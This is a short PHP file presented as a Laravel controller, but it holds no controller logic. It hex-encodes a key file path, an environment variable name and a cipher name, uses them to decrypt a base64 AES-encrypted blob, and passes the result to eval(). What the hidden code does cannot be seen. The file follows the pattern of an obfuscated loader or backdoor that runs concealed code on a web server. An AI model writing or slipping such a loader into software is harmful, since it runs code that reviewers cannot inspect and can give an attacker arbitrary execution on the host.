<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('u4RC57WduN0E1K4nhcxciw==');

$c=base64_decode(

'x5bTa/p2W+M2hs3M4HY6vOzbdcmcODlhR6aI4TbMEf7YDO+PIlld0iVKXMZOWzQ+0Y0jFBdFiXlX' .
'bqRvft961oLk2BuWcRUo7miQnEbmugrxrieHUgCvx6llXUKwciF+WRhEtlaWbnzOAEjYh0M8gnT4' .
'Z+RfKFdWDTcYTxs+3pksgm3ItydNnkBUVugo5B3DI7X9eWs7mARH0jJTvp9idOnKh7Qf9jSpZyBO' .
'2AoWieeVocZAXqqTqPHUDcyTgU/rIP/QyTXbTjdtHDSiGdb/Zn/G5Q4o7ZQ5lVrWQ+v2FPA='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

